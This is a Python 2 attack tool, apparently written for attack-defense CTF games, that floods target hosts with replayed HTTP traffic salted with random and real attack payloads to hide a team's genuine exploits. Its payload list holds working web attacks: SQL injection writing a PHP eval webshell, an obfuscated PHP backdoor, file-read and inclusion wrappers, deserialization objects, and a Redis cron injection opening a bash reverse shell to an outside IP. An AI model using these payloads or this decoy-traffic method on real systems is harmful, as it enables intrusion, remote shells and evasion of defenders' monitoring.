#!/usr/bin/env python
# -*- coding: utf-8 -*-


from framework.http import http
from framework.config import *
import requests
import os,sys,json,time
from random import randint
import base64
from urllib import quote,unquote,urlencode
import Cookie
import threading
from copy import deepcopy

reload(sys)  
sys.setdefaultencoding('utf8')


'''
	@name confused_traffic
	@author Hence Zhang
	@time 2018.6
	@verison v0.2

	I design this program mainly to generate confused http traffic for AWD,
	in order to protect our real payload from people's eyesight. Furthermore,
	it can provide an interface for the attacking scripts to insert several
	confused traffic for advanced protection

'''
#######  configuration  ########
target_list = [y.split(':') for y in [x.strip() for x in open('./data/ip.data').readlines()]]
log_dir = "./trash_traffic/logs/comp:8803/"
traffic_thread_num = 4
payload_count = 10
sleep_time = 1
timeout = 2
debug = True

# in crazy mod, all of the payloads are new 
crazy_level = 1

###############################


class Traffic():
	def load_traffic(self):
		'''
			this function will load the traffic recorded by the the mitmproxy to your RAM

		'''
		self.traffic = {}
		if not os.path.isdir(log_dir):
			print '[!] log dir not exist'
			sys.exit()
		self.traffic_hashes = os.listdir(log_dir)
		for traffic_hash in self.traffic_hashes:
			self.traffic[traffic_hash] = json.loads(open(log_dir + traffic_hash).read())


	def load_headers(self):
		'''
			everytime run with this function, it will return a ac_lang and ua
		'''
		self.ac_langs = ['en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3',
		"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
		"zh-CN,zh;q=0.8",
		"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2",
		"en-US,en;q=0.5",
		"zh-CN,zh;q=0.9",
		"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
		"zh-CN,zh;q=0.9,ja;q=0.8,en;q=0.7",
		"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
		"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
		"zh-CN,zh;q=0.8,en;q=0.6",
		"zh-CN,zh;q=0.8"
		]
		self.user_agents = [x.strip() for x in open("./data/ua.data","rb").readlines()]

	def get_header(self):

		headers = {'Accept-Language':self.ac_langs[randint(0,len(self.ac_langs)-1)],
					'User-Agent':self.user_agents[randint(0,len(self.user_agents)-1)],
					'Hacker-by':'Redbud'}
		return headers

	def get_payload(self):
		'''
			everytime run with this function, it will return a payload
		'''
		choice = randint(1,4)
		if choice == 1:
			self.payload = self.random_payload()
		elif choice == 2:
			self.payload = self.args_payload()
		# improve the possibility of real payload
		else:
			self.payload = self.real_payload()
		return self.payload


	def random_arg(self):
		'''
			return with payload_args
		'''
		result = []

		# generate arg from args array
		args = ['','code','23333','eval','flag','password','deadbeef','system','pwd','pass','shell','cmd']
		payload_arg = args[randint(1,len(args)-1)]
		result.append(payload_arg)

		# generate random arg
		payload_arg = ''
		for m in xrange(randint(1,6)):
			payload_arg += chr(randint(49,122))
		result.append(payload_arg)

		return result


	def args_payload(self):
		'''
			return with payload value, payload is linux-cmd like

		'''
		action_str = ['cat','ls','rm','cp','gcc','cc','ssh','python','php','bash','/bin/sh','nc','nmap','scp','ld','make','netstat']
		argument_str = ['-c','-A','--privilege=true','-G','-O','-d','-la','-an','-SRlC','-T','-u']
		file_str = ['/home/flag','/etc/passwd','/var/www/html','index.php','flag.php','http://10.13.12.1','flag.log','download.php','upload.php','login.php','logout.php']
		
		payload_value = []
		payload_value.append(action_str[randint(1,len(action_str)-1)])
		for j in xrange(randint(1,6)):
			payload_value.append(argument_str[randint(0,len(argument_str)-1)])
		payload_value.append(file_str[randint(0,len(file_str)-1)])
		payload_value = ' '.join(payload_value)
		
		return quote(payload_value)

	def random_payload(self):
		'''
			completely random payload with base64 encode
		'''
		payload_value = ''
		payload_arg = ''
		for m in xrange(10,30):
			payload_value += chr(randint(65,127))
		payload_value =  base64.b64encode(payload_value)
		
		return quote(payload_value)

	def real_payload(self):
		'''
			payload from real life
		'''
		real_payloads = ["25+union+select 1,2,3,4,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e+into+outfile+'./shell1.php'",
		"@$_='s'.'s'./*-/*-*/'e'./*-/*-*/'r'; @$_=/*-/*-*/'a'./*-/*-*/$_./*-/*-*/'t'; @$_/*-/*-*/($/*-/*-*/{'_P'./*-/*-*/'OS'./*-/*-*/'T'} [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);",
		"zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png#shell&a=system&b=ls",
		"php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php",
		'O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:5:"aaaa";}',
		"%0a&shell[]=php&shell[]=system&shell[]=ls",
		'O:3:"Foo":1:{s:4:"file";s:11:"_shell1.php";}',
		"誠' union select 1,0x706870636D73,0x3831346539303966363566316439313263646237636333393833623934333239,4,1,6,7 -- k"]
		real_payloads.append("%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F327187384%2f12344%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379/")
		real_payloads.append("kkk%89' and extractvalue(1, concat(0x7e, (select substr(authkey,1,30) FROM v9_sso_applications where appid=1),0x7e))–%20m")
		result = real_payloads[randint(0,len(real_payloads)-1)]
		if randint(0,1):
			result = base64.b64encode(real_payloads[randint(0,len(real_payloads)-1)])
		return result

	def traffic_modify(self):
		'''
			try to modify the original traffic with our malicious data
		'''
		my_traffic = deepcopy(self.traffic[self.traffic_hashes[randint(0,len(self.traffic_hashes)-1)]])
		content = my_traffic['content']
		query = my_traffic['query']
		query = dict([(i, query[i][0]) if query[i] else (i, '') for i in query])
		cookie = self.cookie_to_dict(my_traffic['header']['Cookie'])
		# modify post
		if content:
			content[content.keys()[randint(0,len(content)-1)]][0] = self.get_payload()
		if query:
			query[query.keys()[randint(0,len(query)-1)]] = self.get_payload()
		if cookie:
			cookie[cookie.keys()[randint(0,len(cookie)-1)]] = self.get_payload()

		my_traffic['content'] = content
		my_traffic['query'] = query
		my_traffic['header']['Cookie'] = self.dict_to_cookie(cookie)
		my_traffic['query_str'] = self.dict_to_query(query)


		return my_traffic
	

	def generate_http_request(self,method,path,query,content,headers,cookies):
		'''
			print the raw http request, just for debugging

		'''
		if query:
			url = path + '?' + urlencode(query)
		else:
			url = path 
		print method + ' ' + url + ' HTTP/1.1'
		for header in headers:
			print header + ': ' + headers[header]
		if cookies:
			print "Cookie: " + cookies
		print ''
		print urlencode(content)


	def cookie_to_dict(self,cookies):
		my_cookie = {}
		cookies = Cookie.SimpleCookie(str(cookies))
		for c in cookies:
			my_cookie[c] = cookies[c].value
		return my_cookie

	def dict_to_cookie(self,cookies):
		my_cookie = ''
		for c in cookies:
			my_cookie += c + '=' + cookies[c] + ';'
		return my_cookie

	def dict_to_query(self,query):
		query_str = ''
		for q in query:
			query_str += q + '=' + query[q] + '&'
		# strip last &
		return query_str[:-1]


	def send_traffic(self):
		'''
			sending traffic according to traffic data
		'''
		if crazy_level == 0:
			info = self.traffic_modify()

		while True:

			if crazy_level == 1:
				info = self.traffic_modify()

			for target in target_list:

				if crazy_level == 2:
					info = self.traffic_modify()

				url = info['scheme'] + '://'  + target[0] + ':' + target[1] + info['path'] 
				try:
					requests.request(info['method'],url,params=info['query'],data=info['content'],headers=info['header'],verify=False,timeout=timeout)
				except Exception,e:
					print '[!] ' + str(e)
					if debug:
						self.generate_http_request(info['method'],info['path'],info['query'],info['content'],info['header'],info['header']['Cookie'])
			time.sleep(sleep_time)


if __name__ == '__main__':

	T = Traffic()
	T.load_traffic()
	T.load_headers()

	for i in xrange(0,traffic_thread_num):
		t = threading.Thread(target=T.send_traffic, name='LoopThread')
		t.setDaemon(True)
		t.start()
		print 'thread %s is running...' % threading.current_thread().name


	try:
		while True:
			pass
	except KeyboardInterrupt:
		print '[!] killed by user'
		sys.exit()
